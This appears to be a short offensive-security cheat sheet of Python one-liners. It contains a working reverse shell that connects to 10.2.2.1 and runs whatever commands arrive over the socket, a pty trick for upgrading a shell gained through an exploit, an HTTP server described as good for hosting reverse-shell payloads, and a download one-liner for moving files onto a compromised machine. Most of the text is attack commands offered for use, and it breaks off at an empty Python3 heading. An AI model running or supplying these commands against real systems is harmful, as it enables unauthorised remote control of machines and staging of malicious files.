# Simple HTTP Server
#great for hosting evil files, especially php reverse shells
#serves up the current working directory
python2:
python -m SimpleHTTPServer 8000
python3:
python3 -m http.server 8000

#Python reverse shell
#netcat like connection, can create a stable shell post-exploitation
python -c "exec(\"import socket, subprocess;s = socket.socket(); s.connect(('10.2.2.1', 37001))\n while 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE); s.send(proc.stdout.read()+proc.stderr.read())\")"

#Raw Shell to Terminal
#turns a raw shell gained from an exploit
python -c 'import pty;pty.spawn("/bin/bash")'

#Python debugger:
python -m pdb <python_file>

#Fetch and DL a file from the web:
#Good for getting files onto a compromised machine that doesn't have wget/curl/etc.
#Python 2:
python -c 'import urllib2; print urllib2.urlopen("http://10.10.10.10").read()' | tee /tmp/file.html
#Python3

